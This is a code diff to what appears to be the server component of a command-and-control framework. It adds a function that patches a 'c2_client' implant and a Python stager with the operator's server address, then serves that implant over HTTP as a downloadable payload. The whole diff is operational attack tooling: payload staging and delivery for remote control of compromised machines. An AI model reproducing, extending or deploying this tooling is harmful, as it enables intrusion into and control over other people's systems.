@@ -60,6 +60,24 @@ def handle_client(client_socket, addr):
             client_socket.close()
             logging.info(f"Connection to {numeric_id} closed")
 
+def update_files():
+    # Update c2_client.py with the server IP
+    c2_client_path = os.path.join(os.path.dirname(__file__), 'Stagers', 'c2_client.py')
+    with open(c2_client_path, 'r') as file:
+        content = file.read()
+    content = content.replace("SERVER_HOST = 'your_server_ip'", f"SERVER_HOST = '{HOST}'")
+    with open(c2_client_path, 'w') as file:
+        file.write(content)
+
+    # Update python_stager.py with the server URL
+    python_stager_path = os.path.join(os.path.dirname(__file__), 'Stagers', 'python_stager.py')
+    server_url = f'http://{HOST}:{HTTP_PORT}/Stagers/c2_client.py'
+    with open(python_stager_path, 'r') as file:
+        content = file.read()
+    content = content.replace("PAYLOAD_URL = 'http://your_server_ip:80/Stagers/c2_client.py'", f"PAYLOAD_URL = '{server_url}'")
+    with open(python_stager_path, 'w') as file:
+        file.write(content)
+
 def start_listener():
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.bind((HOST, PORT))
@@ -78,6 +96,9 @@ def start_http_server():
     if not os.path.isfile(payload_path):
         print(f"[!] Payload file not found: {payload_path}")
         return
+
+    # Update files before starting the server
+    update_files()
 
     os.chdir(os.path.dirname(payload_path))
     handler = http.server.SimpleHTTPRequestHandler
